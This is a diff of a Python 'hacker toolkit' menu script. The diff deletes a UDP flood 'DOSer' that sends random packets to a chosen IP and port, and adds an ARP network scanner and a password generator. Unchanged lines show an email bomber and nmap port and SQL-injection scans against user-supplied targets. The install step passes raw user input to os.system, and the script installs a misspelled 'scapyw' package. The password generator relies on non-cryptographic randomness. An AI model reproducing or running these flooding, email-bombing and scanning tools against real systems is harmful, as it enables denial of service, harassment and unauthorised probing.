@@ -1,12 +1,11 @@
 #################################################--import libraries and install if not installed--#################################################
 import subprocess, platform, random, string, time, sys, os, re, smtplib
-
-installing = input("is pip or pip3 installed?(pip/pip3)")
 try:
-    import pyfiglet, json, pprint, nmap, whois, pyperclip, requests as rq, pyshorteners as ps
+    import pyfiglet, json, pprint, whois, pyperclip, requests as rq, pyshorteners as ps, scapy.all as scapy, netifaces
 except ModuleNotFoundError:
+    installing = input("is pip or pip3 installed?(pip/pip3)")
     print("modules are not installed")
-    os.system(installing+" install pyfiglet pyperclip requests python-whois python-nmap==0.6.1 pyshorteners==1.0.1")
+    os.system(installing+" install netifaces pyfiglet pyperclip requests python-whois scapyw pyshorteners==1.0.1")
     print("Got An Error?, restart the program!")
 
 import pyfiglet
@@ -32,8 +31,9 @@ while ans:
     7. WAF(WEB APP FIREWALL) Detection (NMAP)
     8. Temp Mail
     9. Email Bomber
-    10. DOSer
-    11. Exit/Quit
+    10. Password Gen
+    11. Network Scanner(RESTART THE SCRIPT AS ROOT/SUDO OR ADMINISTRATOR)
+    12. Exit
     """)
     ans=input("Choose Your T00l: ") 
     if ans=="1":
@@ -75,42 +75,21 @@ while ans:
                     set_path = 'setx PATH "%PATH%;C:\\Program Files (x86)\\Nmap"'
                     os.system(set_path)
                     print("Finished Setting Nmap To PATH")
-                    print()
                     print("If you get an error open another cmd/terminal and execute python script")
-                    ip = input ("IP Target -->: ")
-                    print ("nmap is scanning ip for open ports please be patient")
+                    ip = input("Enter IP To port Scan -->: ")
+                    print ("nmap is scanning ip for ports please be patient")
                     print("Waiting for too long?, hit any key")
                     print ()
-                    nm = nmap.PortScanner()
-                    nm.scan(ip, '0-1024')
-                    for host in nm.all_hosts():
-                        print('----------------------------------------------------')
-                        print('Host : {} ({})'.format(ip, nm[ip].hostname()))
-                        print('State : {}'.format(nm[ip].state()))
-                        for proto in nm[ip].all_protocols():
-                            print('----------')
-                            print('Protocol : {}'.format(proto))
-                            lport = nm[ip][proto].keys()
-                            for port in lport:
-                                print ('port : {}\tstate : {}'.format(port, nm[ip][proto][port]['state']))
+                    subprocess.call(['nmap', ip])
+                    print("If No Results It Has No Open Ports!")
                 else:
                     print("If you get an error open another cmd/terminal and execute python script")
-                    ip = input ("IP Target -->: ")
-                    print ("nmap is scanning ip for open ports please be patient")
+                    ip = input("Enter IP To port Scan -->: ")
+                    print ("nmap is scanning ip for ports please be patient")
                     print("Waiting for too long?, hit any key")
                     print ()
-                    nm = nmap.PortScanner()
-                    nm.scan(ip, '0-1024')
-                    for host in nm.all_hosts():
-                        print('----------------------------------------------------')
-                        print('Host : {} ({})'.format(ip, nm[ip].hostname()))
-                        print('State : {}'.format(nm[ip].state()))
-                        for proto in nm[ip].all_protocols():
-                            print('----------')
-                            print('Protocol : {}'.format(proto))
-                            lport = nm[ip][proto].keys()
-                            for port in lport:
-                                print ('port : {}\tstate : {}'.format(port, nm[ip][proto][port]['state']))
+                    subprocess.call(['nmap', ip])
+                    print("If No Results It Has No Open Ports!")
             elif answer == "no":
                 print("")
                 print("Install Nmap Here!:")
@@ -170,7 +149,7 @@ while ans:
                 print("Finished Setting Nmap To PATH")
                 print("If you get an error open another cmd/terminal and execute python script")
                 w = input("Enter Top-Level-Domain Url To SQLI Scan(example.com) -->: ")
-                print ("nmap is scanning ip for SQLI please be patient")
+                print ("nmap is scanning website for SQLI please be patient")
                 print("Waiting for too long?, hit any key")
                 print ()
                 subprocess.call(['nmap', '--script', 'http-sql-injection', w])
@@ -178,7 +157,7 @@ while ans:
             else:
                 print("If you get an error open another cmd/terminal and execute python script")
                 w = input("Enter  Top-Level-Domain Url To SQLI Scan(example.com) -->: ")
-                print ("nmap is scanning ip for SQLI please be patient")
+                print ("nmap is scanning website for SQLI please be patient")
                 print("Waiting for too long?, hit any key")
                 print ()
                 subprocess.call(['nmap', '--script', 'http-sql-injection', w])
@@ -308,27 +287,80 @@ while ans:
         print("sent {} emails. :)".format(email_amount))
         server.quit()
     elif ans=="10":
-######################################--DOSER--#################################################
-        import socket
-        timing = input("Enter time: ")
-        def doser(pingtime):
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            bytes = random._urandom(1490)
-            ip1 = input("Enter IP: ")
-            port1 = input("Enter port: ")
-            sent = 0
-            prevtime = int(round(float(time.time())))
-            while True:
-                sock.sendto(bytes, (ip1, int(port1)))
-                sent = int(sent) + 1
-                port = int(port1) + 1
-                if port == 65534:
-                    port = 1
-                if int(round(float(time.time())))-prevtime == pingtime:
-                    break
-
-        doser(int(timing))
+######################################--PASSWORD GEN--#################################################
+        if platform.system() == 'Windows':
+            os.system("cls")
+        else:
+            os.system("clear")
+        print(ascii_banner)
+        print("					By CxllZ")
+        uppercase_letters = "ABCDEFGHIJKLMNOPQRSTUVWYZ"
+        lowercase_letters = uppercase_letters.lower()
+        digits = "0123456789"
+        symbols = "!@£$%&?:<>"
+        uppercheck = input("Do You Want To Include Upper Letters?(y/n): ")
+        if uppercheck == 'y':
+            upper = True
+        else:
+            upper = False
+        lowercheck = input("Do You Want To Include Lower Letters?(y/n): ")
+        if lowercheck == 'y':
+            lower = True
+        else:
+            lower = False
+        numcheck = input("Do You Want To Include Numbers?(y/n): ")
+        if numcheck == 'y':
+            nums = True
+        else:
+            nums = False
+        symscheck = input("Do You Want To Include Symbols?(y/n): ")
+        if symscheck == 'y':
+            syms = True
+        else:
+            syms = False
+        all = ""
+        if upper:
+            all += uppercase_letters
+        if lower:
+            all += lowercase_letters
+        if nums:
+            all += digits
+        if syms:
+            all += symbols
+        choose_length = int(input("Enter Your Desired Length Of Passwords: "))
+        choose_amount = int(input("Enter Your Desired Amount Of Passwords: "))
+        length = choose_length
+        amount = choose_amount
+        for x in range(amount):
+            password = "".join(random.sample(all, length))
+            print(password)
+######################################--NET SCANNER--#################################################
     elif ans=="11":
+        def scan(ip):
+            arp_req_frame = scapy.ARP(pdst = ip)
+
+            broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
+            
+            broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
+
+            answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 0.5, verbose = False)[0]
+            result = []
+            for i in range(0,len(answered_list)):
+                client_dict = {"ip" : answered_list[i][1].psrc, "mac" : answered_list[i][1].hwsrc}
+                result.append(client_dict)
+
+            return result
+        
+        def display_result(result):
+            print("-----------------------------------\nIP Address\tMAC Address\n-----------------------------------")
+            for i in result:
+                print("{}\t{}".format(i["ip"], i["mac"]))
+
+        gateways = netifaces.gateways()
+        default_gateway = gateways['default'][netifaces.AF_INET][0]
+        scanned_output = scan(default_gateway+"/24")
+        display_result(scanned_output)
+    elif ans=="12":
 ######################################--EXIT--#################################################
         exit()
     elif ans !="":
